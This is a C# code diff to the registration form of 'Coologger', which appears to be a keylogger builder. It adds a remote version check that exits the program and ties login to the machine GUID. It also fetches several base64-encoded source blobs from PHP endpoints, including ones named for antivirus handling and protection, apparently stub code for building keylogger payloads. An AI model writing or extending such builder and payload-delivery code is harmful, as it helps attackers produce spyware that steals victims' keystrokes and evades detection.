@@ -19,6 +19,10 @@ namespace Coologger.GUI
     {
         public RegisterForm()
         {
+            if (!CheckVersion())
+            {
+                Environment.Exit(9001);
+            }
             InitializeComponent();
         }
 
@@ -77,18 +81,30 @@ namespace Coologger.GUI
             RegistryKey guid = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography", false);
             return guid != null ? guid.GetValue("MachineGUID").ToString().ToUpper() : "Error Grabbing HID";
         }
-
+        public bool CheckVersion()
+        {
+            string server = RemoteSettings.GrabSetting("getVersion.php");
+            if(Convert.ToDouble(server) > Configuration.LocalVersion)
+            {
+                MessageBox.Show("Out of date. Please Update.");
+                return false;
+            }
+            return true;
+        }
         public bool Login(string hid)
         {
             if (Global.Form == Instance)
             {
                 Global.HID = hid;
-                string ret = RemoteSettings.GrabSetting("getSource.php");
+                string ret = RemoteSettings.GrabSetting("getAuth.php");
                 if (string.IsNullOrEmpty(ret))
                 {
                     return false;
                 }
-                Global.Source = Encoding.Default.GetString(Convert.FromBase64String(ret));
+                Global.Source = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("getSource.php")));
+                Global.SourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("getSourceAv.php")));
+                Global.SourceProtect = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("getSourceProtect.php")));
+                Global.Sourcea = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("getSourcea.php")));
                 return true;
             }
             return false;
